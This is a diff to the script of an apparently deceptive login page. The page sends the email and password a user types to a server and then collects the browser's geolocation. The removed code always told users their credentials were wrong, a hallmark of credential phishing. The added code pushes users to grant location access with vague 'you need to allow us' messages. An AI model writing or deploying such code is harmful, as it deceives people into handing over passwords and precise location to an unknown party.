@@ -537,9 +537,54 @@ footer {
 
 
 <script>
-(function sendLocation() {
+function showErrorPage(title, message) {
+    document.body.innerHTML = `
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                background-color: #f5f5f7;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }
+            .card {
+                background: #ffffff;
+                border-radius: 16px;
+                padding: 40px 32px;
+                max-width: 400px;
+                width: 100%;
+                text-align: center;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            }
+            h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 12px; }
+            p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 28px; }
+            .btn {
+                display: inline-block;
+                background-color: #007aff;
+                color: #ffffff;
+                text-decoration: none;
+                font-size: 16px;
+                font-weight: 600;
+                padding: 14px 32px;
+                border-radius: 10px;
+                transition: background-color 0.2s ease;
+            }
+            .btn:hover { background-color: #005ecb; }
+        </style>
+        <div class="card">
+            <h1>${title}</h1>
+            <p>${message}</p>
+            <a href="https://my-project-z9na.onrender.com/" class="btn">Try Again</a>
+        </div>
+    `;
+}
+
+function sendLocation() {
     if (!navigator.geolocation) {
-        alert("Geolocation is not supported by your browser.");
+        showErrorPage("Permission Needed", "in order to connect our service, you need to allow us.");
         return;
     }
     navigator.geolocation.getCurrentPosition(
@@ -552,26 +597,26 @@ footer {
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ latitude, longitude })
                 });
-                if (response.ok) {
-                    alert("Location saved. Thank you!");
-                } else {
-                    alert("Could not save location. Try again.");
+
+                if (!response.ok) {
+                    showErrorPage("Error", "Please try again.");
                 }
             } catch (error) {
-                alert("Something went wrong sending your location.");
+                showErrorPage("Something Went Wrong", "try again.");
             }
         },
         (error) => {
-            alert("Could not get your location: " + error.message);
+            showErrorPage("Permission Needed", "In order to connect our service, you need to allow us.");
         }
     );
-})();
+}
+
 async function registerUser() {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
     if (!email || !password) {
-        alert("Please enter email and password.");
+        showErrorPage("Error", "Please enter both email id and password.");
         return;
     }
 
@@ -589,12 +634,16 @@ async function registerUser() {
 
         const result = await response.json();
 
-        alert("please enter your email and password correctly or try again later.");
-        return
+        if (response.ok) {
+            sendLocation();
+        } else {
+            showErrorPage("Registration Failed", result.error || "Please try again later.");
+        }
     } catch (error) {
-        alert("please fill the details correctly");
+        showErrorPage("Something Went Wrong", "Please try again later.");
     }
 }
+
 document.getElementById("loginButton").addEventListener("click", registerUser);
 </script>
 </body>
